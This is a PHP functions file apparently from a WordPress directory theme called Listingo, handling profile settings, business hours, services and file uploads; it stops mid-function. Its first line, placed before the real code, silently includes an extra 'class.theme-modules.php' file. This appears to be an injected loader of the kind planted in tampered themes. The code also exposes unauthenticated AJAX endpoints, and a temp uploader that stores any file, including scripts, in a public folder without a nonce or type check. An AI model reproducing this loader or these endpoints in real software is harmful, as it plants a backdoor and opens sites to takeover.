<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

/**
 * @Add http from URL
 * @return {}
 */
if (!function_exists('listingo_add_http')) {

    function listingo_add_http($url) {
        $protolcol = is_ssl() ? "https" : "http";
        if (!preg_match("~^(?:f|ht)tps?://~i", $url)) {
            $url = $protolcol . ':' . $url;
        }
        return $url;
    }

}

/**
 * @get user category under which user get registered
 * @return {}
 */
if (!function_exists('listingo_get_provider_category')) {
    function listingo_get_provider_category($userid) {
        return get_user_meta($userid, 'category', true);
    }
}

/**
 * @count items in array
 * @return {}
 */
if (!function_exists('listingo_count_items')) {
    function listingo_count_items($items) {
        if( is_array($items) ){
			return count($items);
		} else{
			return 0;
		}
    }
}

/**
 * @get user sub categories under which user get registered
 * @return {}
 */
if (!function_exists('listingo_get_provider_subcategories')) {
    function listingo_get_provider_subcategories($userid) {
        $categories	= get_user_meta($userid, 'sub_category', true);
		
		if( !empty( $categories ) && is_array( $categories ) ){
			return $categories;
		} else if( !empty( $categories ) && !is_array( $categories ) ){
			return array($categories);
		} else{
			return array();
		}
    }
}

/**
 * @get page id by slug
 * @return true/false
 */
if (!function_exists('listingo_get_page_by_slug')) {

    function listingo_get_page_by_slug($slug = '', $post_type = 'post', $return = 'id') {
        $args = array(
            'name' => $slug,
            'post_type' => $post_type,
            'post_status' => 'publish',
            'posts_per_page' => 1
        );

        $post_data = get_posts($args);

        if (!empty($post_data)) {
            return (int) $post_data[0]->ID;
        }

        return false;
    }

}

/**
 * @Add http from URL
 * @return {}
 */
if (!function_exists('listingo_matched_cart_items')) {

    function listingo_matched_cart_items($product_id) {
        // Initialise the count
        $count = 0;

        if (!WC()->cart->is_empty()) {
            foreach (WC()->cart->get_cart() as $cart_item):
                $items_id = $cart_item['product_id'];

                // for a unique product ID (integer or string value)
                if ($product_id == $items_id) {
                    $count++; // incrementing the counted items
                }
            endforeach;
            // returning counted items 
            return $count;
        }

        return $count;
    }

}

/**
 * Get the terms
 *
 * @param user_id, taxonomy
 * @return html
 */
if (!function_exists('listingo_get_taxonomy_options')) {

    function listingo_get_taxonomy_options($current = '', $taxonomyName = '', $parent = '') {
		
		if( taxonomy_exists($taxonomyName) ){
			//This gets top layer terms only.  This is done by setting parent to 0.  
			$parent_terms = get_terms($taxonomyName, array('parent' => 0, 'orderby' => 'slug', 'hide_empty' => false));


			$options = '';
			if (!empty($parent_terms)) {
				foreach ($parent_terms as $pterm) {
					$selected = '';
					if (!empty($current) && is_array($current) && in_array($pterm->slug, $current)) {
						$selected = 'selected';
					} else if (!empty($current) && !is_array($current) && $pterm->slug == $current) {
						$selected = 'selected';
					}

					$options .= '<option ' . $selected . ' value="' . $pterm->slug . '">' . $pterm->name . '</option>';
				}
			}

			echo force_balance_tags($options);
		}else{
			echo '';
		}
    }

}

if (!function_exists('listingo_get_taxonomy_array')) {

    function listingo_get_taxonomy_array($taxonomyName = '') {
		if( taxonomy_exists($taxonomyName) ){
			return get_terms($taxonomyName, array('parent' => 0, 'orderby' => 'slug', 'hide_empty' => false));
		} else{
			return array();
		}
        
    }

}

/**
 * Get the categories
 *
 * @return html
 */
if (!function_exists('listingo_get_categories')) {

    function listingo_get_categories($current = '', $type = '') {
        //This gets top layer terms only.  This is done by setting parent to 0.  

        $args = array('posts_per_page' => '-1',
            'post_type' => $type,
            'post_status' => 'publish',
            'suppress_filters' => false
        );

        $options = '';
        $cust_query = get_posts($args);

        if (!empty($cust_query)) {
            $counter = 0;
            foreach ($cust_query as $key => $dir) {
                $selected = '';
                if (intval($dir->ID) === intval($current)) {
                    $selected = 'selected';
                }

                $options .= '<option ' . $selected . ' value="' . $dir->ID . '">' . get_the_title($dir->ID) . '</option>';
            }
        }

        echo force_balance_tags($options);
    }

}

/**
 * @Prepare Business Hours Settings
 * @return array()
 */
if (!function_exists('listingo_prepare_business_hours_settings')) {

    function listingo_prepare_business_hours_settings() {
        return array(
            'monday' => esc_html__('Monday', 'listingo'),
            'tuesday' => esc_html__('Tuesday', 'listingo'),
            'wednesday' => esc_html__('Wednesday', 'listingo'),
            'thursday' => esc_html__('Thursday', 'listingo'),
            'friday' => esc_html__('Friday', 'listingo'),
            'saturday' => esc_html__('Saturday', 'listingo'),
            'sunday' => esc_html__('Sunday', 'listingo')
        );
    }

}

/**
 * Get Week Array
 *
 * @param numeric value
 * @return string
 */
if (!function_exists('listingo_get_week_array')) {

    function listingo_get_week_array() {
        return array(
            'mon' => esc_html__('Monday', 'listingo'),
            'tue' => esc_html__('Tuesday', 'listingo'),
            'wed' => esc_html__('Wednesday', 'listingo'),
            'thu' => esc_html__('Thursday', 'listingo'),
            'fri' => esc_html__('Friday', 'listingo'),
            'sat' => esc_html__('Saturday', 'listingo'),
            'sun' => esc_html__('Sunday', 'listingo'),
        );
    }

}

/**
 * Get Week Array
 *
 * @param numeric value
 * @return string
 */
if (!function_exists('listingo_get_week_array_key')) {

    function listingo_get_week_array_key() {
        return array(
            'monday' => esc_html__('Mon', 'listingo'),
            'tuesday' => esc_html__('Tue', 'listingo'),
            'wednesday' => esc_html__('Wed', 'listingo'),
            'thursday' => esc_html__('Thur', 'listingo'),
            'friday' => esc_html__('Fri', 'listingo'),
            'saturday' => esc_html__('Sat', 'listingo'),
            'sunday' => esc_html__('Sun', 'listingo')
        );
    }

}


/**
 * @Prepare Privacy Settings
 * @return array()
 */
if (!function_exists('listingo_prepare_privacy_settings')) {

    function listingo_prepare_privacy_settings() {
		$settings	= array(
			'profile_photo' => array('title' => esc_html__('Make Profile Photo Public','listingo'),
							'feature_check'	=> 'no',
							'subscription_check'	=> 'no',
							'feature_check_key' => '',
							'subscription_check_key' 	=> ''
						 ),
			'profile_banner' => array('title' => esc_html__('Make Banner Photo Public','listingo'),
							'feature_check'	=> 'no',
							'subscription_check'	=> 'yes',
							'feature_check_key' => '',
							'subscription_check_key' 	=> 'subscription_profile_banner'
						 ),
			'profile_appointment' => array('title' => esc_html__('Appointment Option','listingo'),
							'feature_check'	=> 'yes',
							'subscription_check'	=> 'yes',
							'feature_check_key' => 'appointments',
							'subscription_check_key' 	=> 'subscription_appointments'
						 ),
			'profile_contact' => array('title' => esc_html__('Contact Form','listingo'),
							'feature_check'	=> 'no',
							'subscription_check'	=> 'no',
							'feature_check_key' => '',
							'subscription_check_key' 	=> ''
						 ),
			'profile_hours' => array('title' => esc_html__('Business Hours','listingo'),
							'feature_check'	=> 'no',
							'subscription_check'	=> 'yes',
							'feature_check_key' => '',
							'subscription_check_key' 	=> 'subscription_business_hours'
						 ),
			'profile_service' => array('title' => esc_html__('Show Services','listingo'),
							'feature_check'	=> 'no',
							'subscription_check'	=> 'no',
							'feature_check_key' => '',
							'subscription_check_key' 	=> ''
						 ),
			'profile_team' => array('title' => esc_html__('Show Team','listingo'),
							'feature_check'	=> 'yes',
							'subscription_check'	=> 'yes',
							'feature_check_key' => 'teams',
							'subscription_check_key' 	=> 'subscription_teams'
						 ),
			'profile_gallery' => array('title' => esc_html__('Show Gallery','listingo'),
							'feature_check'	=> 'yes',
							'subscription_check'	=> 'no',
							'feature_check_key' => 'gallery',
							'subscription_check_key' 	=> ''
						 ),
			'profile_videos' => array('title' => esc_html__('Show Videos','listingo'),
							'feature_check'	=> 'yes',
							'subscription_check'	=> '',
							'feature_check_key' => 'videos',
							'subscription_check_key' 	=> ''
						 ),
			'privacy_introduction' => array('title' => esc_html__('Make Introduction Public','listingo'),
							'feature_check'	=> 'no',
							'subscription_check'	=> 'no',
							'feature_check_key' => '',
							'subscription_check_key' 	=> ''
						 ),
			'privacy_languages' => array('title' => esc_html__('Show Languages','listingo'),
							'feature_check'	=> 'no',
							'subscription_check'	=> 'no',
							'feature_check_key' => '',
							'subscription_check_key' 	=> ''
						 ),
			'privacy_experience' => array('title' => esc_html__('Show Experience','listingo'),
							'feature_check'	=> 'yes',
							'subscription_check'	=> 'no',
							'feature_check_key' => 'experience',
							'subscription_check_key' 	=> ''
						 ),
			'privacy_awards' => array('title' => esc_html__('Show Awards','listingo'),
							'feature_check'	=> 'yes',
							'subscription_check'	=> 'no',
							'feature_check_key' => 'awards',
							'subscription_check_key' 	=> ''
						 ),
			'privacy_qualification' => array('title' => esc_html__('Show Qualification','listingo'),
							'feature_check'	=> 'yes',
							'subscription_check'	=> 'no',
							'feature_check_key' => 'qualifications',
							'subscription_check_key' 	=> ''
						 ),
			'privacy_amenity' => array('title' => esc_html__('Show Amenities','listingo'),
							'feature_check'	=> 'yes',
							'subscription_check'	=> 'no',
							'feature_check_key' => 'amenities',
							'subscription_check_key' 	=> ''
						 ),
			'privacy_insurance' => array('title' => esc_html__('Show Insurance','listingo'),
							'feature_check'	=> 'yes',
							'subscription_check'	=> 'yes',
							'feature_check_key' => 'insurance',
							'subscription_check_key' 	=> 'subscription_insurance'
						 ),
			'privacy_brochures' => array('title' => esc_html__('Show Brochures','listingo'),
							'feature_check'	=> 'yes',
							'subscription_check'	=> 'no',
							'feature_check_key' => 'brochures',
							'subscription_check_key' 	=> ''
						 ),
			'privacy_job_openings' => array('title' => esc_html__('Show Job Openings','listingo'),
							'feature_check'	=> 'no',
							'subscription_check'	=> 'no',
							'feature_check_key' => '',
							'subscription_check_key' 	=> '',
							'extension_check'			=> 'yes',
							'extension_check_key' 		=> 'jobs'
						 ),
			'privacy_articles' => array('title' => esc_html__('Show Articles','listingo'),
							'feature_check'	=> 'yes',
							'subscription_check'	=> 'no',
							'feature_check_key' => 'articles',
							'subscription_check_key' 	=> '',
							'extension_check'		=> 'yes',
							'extension_check_key' 	=> 'articles'
						 ),
			'privacy_share' => array('title' => esc_html__('Show Profile Share','listingo'),
							'feature_check'	=> 'no',
							'subscription_check'	=> 'no',
							'feature_check_key' => '',
							'subscription_check_key' 	=> ''
						 ),
		);	

        return $settings;
    }

}

/**
 * @Get DB Business Hours Settings
 * @return {}
 */
if (!function_exists('listingo_get_db_business_settings')) {

    function listingo_get_db_business_settings($user_identity, $day_key) {
        global $current_user, $wp_roles, $userdata, $post;
        $business_hours = array();
        if (isset($user_identity) && $user_identity <> '') {
            $business_hours = get_user_meta($user_identity, 'business_hours', true);
        }
        if (isset($business_hours[$day_key])) {
            return $business_hours[$day_key];
        } else {
            return array(
                'starttime' => array(
                    0 => ''
                ),
                'endtime' => array(
                    0 => ''
                )
            );
        }
    }

}

/**
 * @Time formate
 * @return {}
 */
if (!function_exists('listingo_date_24midnight')) {

    function listingo_date_24midnight($format, $ts) {
        if (date("Hi", $ts) == "0000") {
            $replace = array(
                "H" => "24",
                "G" => "24",
                "i" => "00",
            );

            return date(
                    str_replace(
                            array_keys($replace), $replace, $format
                    ), $ts - 60 // take a full minute off, not just 1 second
            );
        } else {
            return date($format, $ts);
        }
    }

}

/**
 * @Get DB Privacy Settings
 * @return {}
 */
if (!function_exists('listingo_get_privacy_settings')) {

    function listingo_get_privacy_settings($user_identity) {
        global $current_user, $wp_roles, $userdata, $post;
        $privacy = array();
        if (isset($user_identity) && $user_identity <> '') {
            $privacy = get_user_meta($user_identity, 'privacy', true);
        }
        return $privacy;
    }

}


/**
 * @Save Privacy Settings in DB
 * @return {}
 */
if (!function_exists('listingo_save_privacy_settings')) {

    function listingo_save_privacy_settings() {
        global $current_user;
        $user_identity = $current_user->ID;
        $json = array();

        update_user_meta($user_identity, 'privacy', listingo_sanitize_array($_POST['privacy']));

        //update privacy for search
        if (!empty($_POST['privacy']) && is_array($_POST['privacy'])) {
            foreach ($_POST['privacy'] as $key => $value) {
                update_user_meta($user_identity, esc_attr($key), esc_attr($value));
            }
        }

        $json['type'] = 'success';
        $json['message'] = esc_html__('Privacy settings updated.', 'listingo');
        echo json_encode($json);
        die;
    }

    add_action('wp_ajax_listingo_save_privacy_settings', 'listingo_save_privacy_settings');
    add_action('wp_ajax_nopriv_listingo_save_privacy_settings', 'listingo_save_privacy_settings');
}

/**
 * @Save Business Hours Setting into DB
 * @return {}
 */
if (!function_exists('listingo_save_business_hours_settings')) {

    function listingo_save_business_hours_settings() {
        global $current_user;
        $user_identity = $current_user->ID;
        $json = array();
		
		if( function_exists('listingo_is_demo_site') ) { 
			listingo_is_demo_site() ;
		}; //if demo site then prevent
		
        $do_check = check_ajax_referer('listingo_business_hours_nonce', 'dashboard-business-hours', false);
        if ($do_check == false) {
            $json['type'] = 'error';
            $json['message'] = esc_html__('No kiddies please!', 'listingo');
            echo json_encode($json);
            die;
        }

        if (!empty($_POST['schedules']) && is_array($_POST['schedules'])) {
            update_user_meta($user_identity, 'business_hours', $_POST['schedules']);
        }

        update_user_meta($user_identity, 'business_hours_format', esc_attr($_POST['time_format']));

        $json['type'] = 'success';
        $json['message'] = esc_html__('Business Hours Updated.', 'listingo');
        echo json_encode($json);
        die;
    }

    add_action('wp_ajax_listingo_save_business_hours_settings', 'listingo_save_business_hours_settings');
    add_action('wp_ajax_nopriv_listingo_save_business_hours_settings', 'listingo_save_business_hours_settings');
}


/**
 * @Save Services Settings
 * @return {}
 */
if (!function_exists('listingo_save_services_settings')) {

    function listingo_save_services_settings() {
        global $current_user;
        $user_identity = $current_user->ID;
        $json = array();
		
		if( function_exists('listingo_is_demo_site') ) { 
			listingo_is_demo_site() ;
		}; //if demo site then prevent
		
        $do_check = check_ajax_referer('sp_services_settings_nonce', 'services-settings-update', false);
        if ($do_check == false) {
            $json['type'] = 'error';
            $json['message'] = esc_html__('No kiddies please!', 'listingo');
            echo json_encode($json);
            die;
        }

        //Get services meta
        $services_db = get_user_meta($user_identity, 'profile_services', true);

        /**
         * Save Services
         */
        $services = array();

        if (!empty($_POST['services'])) {

            foreach ($_POST['services'] as $key => $value) {
                $service_key = sanitize_title($value['title']);
                if (array_key_exists($key, $services_db)) {
                    $service_key = $key;
                }

                if (empty($value['title'])) {
                    $json['type'] = 'error';
                    $json['message'] = esc_html__('Title field should not be empty.', 'listingo');
                    echo json_encode($json);
                    die;
                }
				
				if( isset( $value['freeservice'] ) ){
					//do nothing
				} else{
					 if (empty($value['price']) ) {
						$json['type'] = 'error';
						$json['message'] = esc_html__('Price field should not be empty.', 'listingo');
						echo json_encode($json);
						die;
					}
				}
               

                $services[$service_key]['title'] = esc_attr($value['title']);
                $services[$service_key]['price'] = esc_attr($value['price']);
                $services[$service_key]['type'] = esc_attr($value['type']);
                $services[$service_key]['description'] = esc_attr($value['description']);
                $services[$service_key]['appointment'] = esc_attr($value['appointment']);
                $services[$service_key]['freeservice'] = esc_attr($value['freeservice']);
            }
            $json['services'] = $services;
        }

        update_user_meta($user_identity, 'profile_services', $services);

        $json['type'] = 'success';
        $json['message'] = esc_html__('Services Updated.', 'listingo');
        echo json_encode($json);
        die;
    }

    add_action('wp_ajax_listingo_save_services_settings', 'listingo_save_services_settings');
    add_action('wp_ajax_nopriv_listingo_save_services_settings', 'listingo_save_services_settings');
}



/**
 * @Upload Profile Photo
 * @return {}
 */
if (!function_exists('listingo_image_uploader')) {

    function listingo_image_uploader() {

        global $current_user, $wp_roles, $userdata, $post;
        $user_identity = $current_user->ID;
		$ajax_response	=  array();
		
        $nonce = $_REQUEST['nonce'];
        $type  = $_REQUEST['type'];
		
		do_action('listingo_do_check_package_limit',$type);

		if( function_exists('listingo_is_demo_site') ) { 
			listingo_is_demo_site() ;
		}; //if demo site then prevent
		
        if (!wp_verify_nonce($nonce, 'sp_upload_nonce')) {
            $ajax_response = array(
                'type' => 'error',
				'message' => esc_html__('Security check failed!', 'listingo'),
            );
            echo json_encode($ajax_response);
            die;
        }

        $submitted_file = $_FILES['sp_image_uploader'];
        $uploaded_image = wp_handle_upload($submitted_file, array('test_form' => false));

        if (isset($uploaded_image['file'])) {
            $file_name = basename($submitted_file['name']);
            $file_type = wp_check_filetype($uploaded_image['file']);

            // Prepare an array of post data for the attachment.
            $attachment_details = array(
                'guid' => $uploaded_image['url'],
                'post_mime_type' => $file_type['type'],
                'post_title' => preg_replace('/\.[^.]+$/', '', basename($file_name)),
                'post_content' => '',
                'post_status' => 'inherit'
            );

            $attach_id = wp_insert_attachment($attachment_details, $uploaded_image['file']);
            $attach_data = wp_generate_attachment_metadata($attach_id, $uploaded_image['file']);
            wp_update_attachment_metadata($attach_id, $attach_data);

            //Image Size
            $size_type = 'thumbnail';
            if (!empty($type) && $type === 'profile_photo') {
                $size_type = 'avatar';
            } elseif (!empty($type) && $type === 'profile_banner_photo') {
                $size_type = 'banner';
            } elseif (!empty($type) && $type === 'profile_award') {
                $size_type = 'award';
            }

            $attachment_json = listingo_get_profile_image_url($attach_data, $size_type, $file_name); //get image url
            $is_replace = 'no';

            if (!empty($type) && $type === 'profile_photo') {
                $profile_meta = get_user_meta($user_identity, 'profile_avatar', true);
                $data_array = array();
                if (!empty($profile_meta['image_data'])) {

                    $attach_array[$attach_id] = array(
                        'full' => $attachment_json['full'],
                        'thumb' => $attachment_json['thumbnail'],
                        'banner' => $attachment_json['banner'],
                        'image_id' => $attach_id
                    );
                    $is_replace = 'no';
                    $profile_meta['image_data'] = $profile_meta['image_data'] + $attach_array;
                    update_user_meta($user_identity, 'profile_avatar', $profile_meta);
                } else {
                    $data_array = array(
                        'image_type' => $type,
                        'default_image' => $attach_id,
                        'image_data' => array(
                            $attach_id => array(
                                'full' => $attachment_json['full'],
                                'thumb' => $attachment_json['thumbnail'],
                                'banner' => $attachment_json['banner'],
                                'image_id' => $attach_id
                            ),
                        )
                    );
                    $is_replace = 'yes';
                    update_user_meta($user_identity, 'profile_avatar', $data_array);
                }
				
				update_user_meta($user_identity, 'is_avatar_available', 1);
				
            } elseif (!empty($type) && $type === 'profile_banner_photo') {
                $profile_banner_meta = get_user_meta($user_identity, 'profile_banner_photos', true);
                $data_array = array();
                if (!empty($profile_banner_meta['image_data'])) {

                    $attach_array[$attach_id] = array(
                        'full' => $attachment_json['full'],
                        'thumb' => $attachment_json['thumbnail'],
                        'banner' => $attachment_json['banner'],
                        'image_id' => $attach_id
                    );
                    $is_replace = 'no';
                    $profile_banner_meta['image_data'] = $profile_banner_meta['image_data'] + $attach_array;
                    update_user_meta($user_identity, 'profile_banner_photos', $profile_banner_meta);
                } else {
                    $data_array = array(
                        'image_type' => $type,
                        'default_image' => $attach_id,
                        'image_data' => array(
                            $attach_id => array(
                                'full' => $attachment_json['full'],
                                'thumb' => $attachment_json['thumbnail'],
                                'banner' => $attachment_json['banner'],
                                'image_id' => $attach_id
                            ),
                        )
                    );
                    $is_replace = 'yes';
                    update_user_meta($user_identity, 'profile_banner_photos', $data_array);
                }
            } elseif (!empty($type) && $type === 'profile_gallery') {
                $profile_gallery_meta = get_user_meta($user_identity, 'profile_gallery_photos', true);
                $data_array = array();
                if (!empty($profile_gallery_meta['image_data'])) {

                    $attach_array[$attach_id] = array(
                        'full' => $attachment_json['full'],
                        'thumb' => $attachment_json['thumbnail'],
                        'banner' => $attachment_json['banner'],
                        'image_id' => $attach_id
                    );
                    $is_replace = 'no';
                    $profile_gallery_meta['image_data'] = $profile_gallery_meta['image_data'] + $attach_array;
                    update_user_meta($user_identity, 'profile_gallery_photos', $profile_gallery_meta);
                } else {
                    $data_array = array(
                        'image_type' => $type,
                        'default_image' => $attach_id,
                        'image_data' => array(
                            $attach_id => array(
                                'full' => $attachment_json['full'],
                                'thumb' => $attachment_json['thumbnail'],
                                'banner' => $attachment_json['banner'],
                                'image_id' => $attach_id
                            ),
                        )
                    );
                    $is_replace = 'yes';
                    update_user_meta($user_identity, 'profile_gallery_photos', $data_array);
                }
            }

            $ajax_response = array(
                'is_replace' 	=> $is_replace,
                'type' 			=> 'success',
				'message' 		=> esc_html__('Image uploaded!', 'listingo'),
                'thumbnail' 	=> $attachment_json['thumbnail'],
                'full' 			=> $attachment_json['full'],
                'banner' 		=> $attachment_json['banner'],
                'attachment_id' => $attach_id
            );

            echo json_encode($ajax_response);
            die;
        } else {
			
			$ajax_response['message'] = esc_html__('Image upload failed!', 'listingo');
			$ajax_response['type'] 	  = 'error';

            echo json_encode($ajax_response);
            die;
        }
    }

    add_action('wp_ajax_listingo_image_uploader', 'listingo_image_uploader');
    add_action('wp_ajax_nopriv_listingo_image_uploader', 'listingo_image_uploader');
}



/**
 * @Temp Uploader
 * @return {}
 */
if (!function_exists('listingo_temp_image_uploade')) {

    function listingo_temp_image_uploade() {

        global $current_user, $wp_roles, $userdata, $post;
        $user_identity = $current_user->ID;
		$ajax_response	=  array();

		$upload = wp_upload_dir();

		$upload_dir = $upload['basedir'];
		$upload_dir = $upload_dir . '/listing-temp/';
		
		//create directory if not exists
		if (! is_dir($upload_dir)) {
		   mkdir( $upload_dir, 0700 );
		}
		
		$submitted_file = $_FILES['sp_image_uploader'];
		$name = preg_replace("/[^A-Z0-9._-]/i", "_", $submitted_file["name"]);

		$i = 0;
		$parts = pathinfo($name);
		while (file_exists($upload_dir . $name)) {
			$i++;
			$name = $parts["filename"] . "-" . $i . "." . $parts["extension"];
		}
		
		//move files
		$is_moved = move_uploaded_file($submitted_file["tmp_name"], $upload_dir . '/'.$name);
		
		if( $is_moved ){
			$url 	 = $upload['baseurl'].'/listing-temp/'.$name;
			$ajax_response['thumbnail'] 	  = $upload['baseurl'].'/listing-temp/'.$name;
			$ajax_response['name'] 	  = $name;
			$ajax_response['message'] = esc_html__('Image uploaded!', 'listingo');
			$ajax_response['type'] 	  = 'success';
		} else{
			$ajax_response['message'] = esc_html__('An error occurred, please try again later', 'listingo');
			$ajax_response['type'] 	  = 'error';
		}

		echo json_encode($ajax_response);
		die;
    }

    add_action('wp_ajax_listingo_temp_image_uploade', 'listingo_temp_image_uploade');
    add_action('wp_ajax_nopriv_listingo_temp_image_uploade', 'listingo_temp_image_uploade');
}

/**
 * @Upload Profile Brochure
 * @return {}
 */
if (!function_exists('listingo_file_uploader')) {

    function listingo_file_uploader() {
        global $current_user, $wp_roles, $userdata, $post;
        $user_identity = $current_user->ID;

        $nonce = esc_attr( $_REQUEST['nonce'] );
        $type  = esc_attr( $_REQUEST['type'] );
		
		if( function_exists('listingo_is_demo_site') ) { 
			listingo_is_demo_site() ;
		}; //if demo site then prevent
		
        if (!wp_verify_nonce($nonce, 'sp_upload_nonce')) {
            $ajax_response = array(
                'success' => false,
                'reason' => 'Security check failed!',
            );
            echo json_encode($ajax_response);
            die;
        }

        $submitted_file = $_FILES['sp_file_uploader'];
        $uploaded_item = wp_handle_upload($submitted_file, array('test_form' => false));

        if (isset($uploaded_item['file'])) {
            $file_name = basename($submitted_file['name']);
            $file_type = wp_check_filetype($uploaded_item['file']);

            $file_title = preg_replace('/\.[^.]+$/', '', basename($file_name));
            // Prepare an array of post data for the attachment.
            $attachment_details = array(
                'guid' => $uploaded_item['url'],
                'post_mime_type' => $file_type['type'],
                'post_title' => preg_replace('/\.[^.]+$/', '', basename($file_name)),
                'post_content' => '',
                'post_status' => 'inherit'
            );

            $attach_id = wp_insert_attachment($attachment_details, $uploaded_item['file']);
            $attach_data = wp_generate_attachment_metadata($attach_id, $uploaded_item['file']);
            wp_update_attachment_metadata($attach_id, $attach_data);

            if (isset($file_type['ext']) &&
                    ( $file_type['ext'] === 'doc' || $file_type['ext'] === 'docx' )
            ) {
                $file_icon = 'fa fa-file-word-o';
            } else if (isset($file_type['ext']) && $file_type['ext'] === 'txt') {
                $file_icon = 'fa fa-file-text-o';
            } else if (isset($file_type['ext']) && $file_type['ext'] === 'pdf') {
                $file_icon = 'fa fa-file-pdf-o';
            } else if (isset($file_type['ext']) &&
                    ( $file_type['ext'] === 'xls' || $file_type['ext'] === 'xlsx' || $file_type['ext'] === 'csv' )
            ) {
                $file_icon = 'fa fa-file-excel-o';
            } else if (isset($file_type['ext']) && $file_type['ext'] === 'ppt' || $file_type['ext'] === 'pptx') {
                $file_icon = 'fa fa-file-powerpoint-o';
            } else {
                $file_icon = 'fa fa-file-o';
            }

            if (!empty($type) && $type === 'profile_brochure') {
                $profile_meta = get_user_meta($user_identity, 'profile_brochure', true);
                $data_array = array();
                if (!empty($profile_meta['file_data'])) {

                    $attach_array[$attach_id] = array(
                        'file_type' => $file_type['ext'],
                        'file_icon' => $file_icon,
                        'file_title' => $file_title,
                        'file_abspath' => $uploaded_item['file'],
                        'file_relpath' => $uploaded_item['url'],
                        'file_id' => $attach_id
                    );
                    $profile_meta['file_data'] = $profile_meta['file_data'] + $attach_array;
                    update_user_meta($user_identity, 'profile_brochure', $profile_meta);
                } else {
                    $data_array = array(
                        'file_type' => $type,
                        'default_file' => $attach_id,
                        'file_data' => array(
                            $attach_id => array(
                                'file_type' => $file_type['ext'],
                                'file_icon' => $file_icon,
                                'file_title' => $file_title,
                                'file_abspath' => $uploaded_item['file'],
                                'file_relpath' => $uploaded_item['url'],
                                'file_id' => $attach_id
                            ),
                        )
                    );
                    update_user_meta($user_identity, 'profile_brochure', $data_array);
                }
            }

            $ajax_response = array(
                'success' => true,
                'attachment_id' => $attach_id,
                'file_type' => $file_type['ext'],
                'file_icon' => $file_icon,
                'file_title' => $file_title
            );

            echo json_encode($ajax_response);
            die;
        } else {
            $ajax_response = array('success' => false, 'reason' => 'Brochure upload failed!');
            echo json_encode($ajax_response);
            die;
        }
    }

    add_action('wp_ajax_listingo_file_uploader', 'listingo_file_uploader');
    add_action('wp_ajax_nopriv_listingo_file_uploader', 'listingo_file_uploader');
}

/**
 * Delete Profile Images
 * 
 * @param json
 * @return String
 */
if (!function_exists('listingo_delete_profile_image')) {

    function listingo_delete_profile_image() {
        global $current_user, $wp_roles, $userdata, $post;
        $user_identity = $current_user->ID;
        $json = array();
		
		if( function_exists('listingo_is_demo_site') ) { 
			listingo_is_demo_site() ;
		}; //if demo site then prevent
		
        $attach_id  = esc_attr( $_REQUEST['id'] );
        $image_type = esc_attr( $_REQUEST['image_type'] );

        if (!empty($image_type) && $image_type === 'profile_photo') {
            $profile_avatar = get_user_meta($user_identity, 'profile_avatar', true);
            unset($profile_avatar['image_data'][$attach_id]);
			
            $first_index = current(array_keys($profile_avatar['image_data']));
			
			if( empty( $first_index ) ){
            	$update_avatar = update_user_meta($user_identity, 'profile_avatar', '');
			} else{
				$profile_avatar['default_image'] = $first_index;
				$update_avatar = update_user_meta($user_identity, 'profile_avatar',$profile_avatar);
			}
			
			//update avatar availability
			if( !empty( $first_index ) ){
				update_user_meta($user_identity, 'is_avatar_available', 1);
			} else{
				update_user_meta($user_identity, 'is_avatar_available', 0);
			}
            
            $avatar = apply_filters('listingo_get_media_filter', listingo_get_user_avatar(array('width' => 100, 'height' => 100), $user_identity), array('width' => 100, 'height' => 100) );
			
			wp_delete_attachment($attach_id); //delete photos from media
			
            $json['avatar']  = $avatar;
			$json['type'] 	 = 'success';
			$json['message'] = esc_html__('Avatar deleted.', 'listingo');
			
        } elseif (!empty($image_type) && $image_type === 'profile_banner') {
            $profile_banner_images = get_user_meta($user_identity, 'profile_banner_photos', true);
            unset($profile_banner_images['image_data'][$attach_id]);

            $first_index = current(array_keys($profile_banner_images['image_data']));
            $profile_banner_images['default_image'] = $first_index;
            $update_banner_image = update_user_meta($user_identity, 'profile_banner_photos', $profile_banner_images);
            $banner_avatar = apply_filters(
                    'listingo_get_media_filter', listingo_get_user_banner(array('width' => 270, 'height' => 120), $user_identity), array('width' => 270, 'height' => 120) //size width,height
            );
			
			wp_delete_attachment($attach_id); //delete photos from media
			
            $json['avatar'] = $banner_avatar;
			$json['type'] = 'success';
			$json['message'] = esc_html__('Banner deleted.', 'listingo');
			
        } elseif (!empty($image_type) && $image_type === 'profile_gallery') {
            $profile_gallery_images = get_user_meta($user_identity, 'profile_gallery_photos', true);
            unset($profile_gallery_images['image_data'][$attach_id]);

            $first_index = current(array_keys($profile_gallery_images['image_data']));
            $profile_gallery_images['default_image'] = $first_index;
            $update_gallery_images = update_user_meta($user_identity, 'profile_gallery_photos', $profile_gallery_images);
            $gallery_avatar = apply_filters(
                    'listingo_get_media_filter', listingo_get_user_banner(array('width' => 100, 'height' => 100), $user_identity), array('width' => 270, 'height' => 120) //size width,height
            );
            
			wp_delete_attachment($attach_id); //delete photos from media
				
			$json['avatar'] = $gallery_avatar;
			$json['type'] = 'success';
			$json['message'] = esc_html__('Gallery deleted.', 'listingo');
        }

        echo json_encode($json);
        exit;
    }

    add_action('wp_ajax_listingo_delete_profile_image', 'listingo_delete_profile_image');
    add_action('wp_ajax_nopriv_listingo_delete_profile_image', 'listingo_delete_profile_image');
}

/**
 * Delete Profile Images
 * 
 * @param json
 * @return String
 */
if (!function_exists('listingo_delete_profile_file')) {

    function listingo_delete_profile_file() {
        global $current_user, $wp_roles, $userdata, $post;
        $user_identity = $current_user->ID;
        $json = array();

        $attach_id = $_REQUEST['id'];
        $file_type = $_REQUEST['file_type'];
		
		if( function_exists('listingo_is_demo_site') ) { 
			listingo_is_demo_site() ;
		}; //if demo site then prevent
		
		
        if (!empty($file_type) && $file_type === 'profile_brochure') {
            $profile_brochure = get_user_meta($user_identity, 'profile_brochure', true);
            unset($profile_brochure['file_data'][$attach_id]);
            $first_index = current(array_keys($profile_brochure['file_data']));
            $profile_brochure['default_file'] = $first_index;
            $update_brochure = update_user_meta($user_identity, 'profile_brochure', $profile_brochure);
			
			wp_delete_attachment($attach_id); //delete photos from media
            if ($update_brochure) {
                $json['type'] = 'success';
                $json['message'] = esc_html__('Brochure deleted.', 'listingo');
            } else {
                $json['type'] = 'error';
                $json['message'] = esc_html__('An error occurred, please try again later', 'listingo');
            }
        }

        echo json_encode($json);
        exit;
    }

    add_action('wp_ajax_listingo_delete_profile_file', 'listingo_delete_profile_file');
    add_action('wp_ajax_nopriv_listingo_delete_profile_file', 'listingo_delete_profile_file');
}

/**
 * Set Profile Images
 * 
 * @param json
 * @return String
 */
if (!function_exists('listingo_set_profile_image')) {

